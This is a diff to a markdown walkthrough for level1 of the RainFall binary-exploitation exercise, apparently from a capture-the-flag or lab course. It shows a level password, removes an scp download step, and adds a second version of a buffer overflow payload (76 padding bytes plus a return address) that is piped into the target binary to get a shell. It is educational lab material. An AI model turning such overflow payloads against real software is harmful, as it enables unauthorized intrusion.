@@ -1,6 +1,5 @@
-# RainFall  – Level1 Complete Walkthrough
+# RainFall  – Level1  Walkthrough
 
-### 🔍 Initial Setup and Reconnaissance
 
 #### Environment Setup
 
@@ -11,8 +10,6 @@ First, let's establish our working environment and examine the target:
 su level1
 # Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
 
-# Optional: Download binary for analysis
-scp -P 4242 -r level1@10.13.249.218:/home/user/level1/level1 .
 ```
 
 ### Initial Binary Examination
@@ -352,6 +349,10 @@ python -c 'print "A"*76 + "\x44\x84\x04\x08"' | ./level1
 **Correct approach** (stdin remains open):
 ```bash
 (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
+```
+**with write**
+```bash
+(python -c 'import sys; sys.stdout.write("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
 ```
 
 ### Why the Difference Matters:
